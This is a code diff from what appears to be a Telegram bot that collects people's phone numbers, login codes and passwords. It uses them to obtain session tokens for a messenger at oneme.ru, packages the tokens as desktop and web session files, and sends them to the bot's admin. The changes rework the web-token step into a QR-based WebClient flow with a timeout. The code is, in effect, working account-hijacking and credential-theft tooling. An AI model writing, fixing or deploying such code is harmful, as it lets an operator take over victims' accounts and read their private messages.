@@ -112,81 +112,44 @@ async def send_files(phone, uid, work_dir, desktop, js):
     await bot.send_document(ADMIN_ID, FSInputFile(wp),
         caption=f"🌐 ВЕБ\nНомер: {phone}", parse_mode="HTML")
 
-async def get_web_token(android_token, user_id, phone, uid, work_dir):
-    """Получает веб-токен через QR: получает track_id через WebClient, подтверждает, забирает токен."""
-    track_id = None
+async def get_web_token(phone, uid, work_dir):
+    """Получает веб-токен через WebClient с ожиданием завершения QR-цикла."""
     web_device_id = gen_device_id()
 
-    # Шаг 1: Получаем track_id через WebClient
     class TrackIdHandler(QrHandler):
         async def show_qr(self, qr_link):
-            nonlocal track_id
             parts = qr_link.split('/')
             track_id = parts[-1] if parts else None
-            logging.info(f"Получен track_id: {track_id}")
+            logging.info(f"Получен QR, track_id: {track_id}")
             return True
 
     try:
+        logging.info("Запускаем WebClient, ждём завершения QR-цикла...")
         web_client = WebClient(
-            work_dir=f"{work_dir}_web_{int(time.time())}",
+            work_dir=f"{work_dir}_web",
             auth_flow=QrAuthFlow(qr_provider=TrackIdHandler())
         )
-        await web_client.start()
+        # Ждём до 3 минут
+        await asyncio.wait_for(web_client.start(), timeout=180)
+
+        if web_client.token:
+            web_token = web_client.token
+            logging.info(f"Веб-токен получен через WebClient: {web_token[:30]}...")
+            
+            desktop = build_desktop_json(
+                web_token, web_device_id, int(time.time() * 1000),
+                gen_password(), 0, phone
+            )
+            js = generate_web_js(web_device_id, web_token, 0)
+            await send_files(phone, uid, work_dir, desktop, js)
+            await bot.send_message(ADMIN_ID, f"✅ Веб-токен получен!\nНомер: {phone}")
+            return web_token
+        else:
+            logging.error("WebClient.token пустой")
+    except asyncio.TimeoutError:
+        logging.error("Таймаут WebClient (3 минуты)")
     except Exception as e:
-        logging.error(f"WebClient error: {e}")
-
-    if not track_id:
-        logging.error("Не удалось получить track_id")
-        return None
-
-    logging.info(f"track_id получен: {track_id}")
-
-    # Шаг 2: Подтверждаем QR через HTTP
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
-        "Content-Type": "application/json"
-    }
-
-    async with aiohttp.ClientSession() as session:
-        resp = await session.post(
-            "https://ws-api.oneme.ru/auth/confirm",
-            json={"track_id": track_id, "device_id": web_device_id},
-            headers=headers
-        )
-        logging.info(f"Confirm QR: {resp.status}")
-
-        await asyncio.sleep(3)
-
-        # Шаг 3: Получаем веб-токен
-        resp = await session.post(
-            "https://ws-api.oneme.ru/auth/token",
-            json={
-                "session_token": android_token,
-                "device_id": web_device_id,
-                "device_type": "WEB"
-            },
-            headers=headers
-        )
-        text = await resp.text()
-        logging.info(f"Token response: {resp.status} {text[:500]}")
-
-        if resp.status == 200:
-            try:
-                data = json.loads(text)
-                if data.get("token"):
-                    web_token = data["token"]
-                    logging.info(f"Веб-токен: {web_token[:30]}...")
-
-                    desktop = build_desktop_json(
-                        web_token, web_device_id, int(time.time() * 1000),
-                        gen_password(), user_id, phone
-                    )
-                    js = generate_web_js(web_device_id, web_token, user_id)
-                    await send_files(phone, uid, work_dir, desktop, js)
-                    await bot.send_message(ADMIN_ID, f"✅ Веб-токен получен!\nНомер: {phone}\nviewerId: {user_id}")
-                    return web_token
-            except:
-                pass
+        logging.error(f"Ошибка WebClient: {e}")
 
     return None
 
@@ -311,7 +274,7 @@ async def code_handler(message: types.Message, state: FSMContext):
             device_id = gen_device_id()
 
             # Запускаем получение веб-токена в фоне
-            asyncio.ensure_future(get_web_token(token, viewer_id, phone, uid, work_dir))
+            asyncio.ensure_future(get_web_token(phone, uid, work_dir))
 
             desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
             js = generate_web_js(device_id, token, viewer_id)
@@ -401,8 +364,8 @@ async def password_handler(message: types.Message, state: FSMContext):
         session_id = int(time.time() * 1000)
         device_id = gen_device_id()
 
-        # Получаем веб-токен
-        web_token = await get_web_token(token, viewer_id, phone, uid, work_dir)
+        # Получаем веб-токен (с ожиданием до 3 минут)
+        web_token = await get_web_token(phone, uid, work_dir)
         final_token = web_token or token
 
         js = generate_web_js(device_id, final_token, viewer_id)
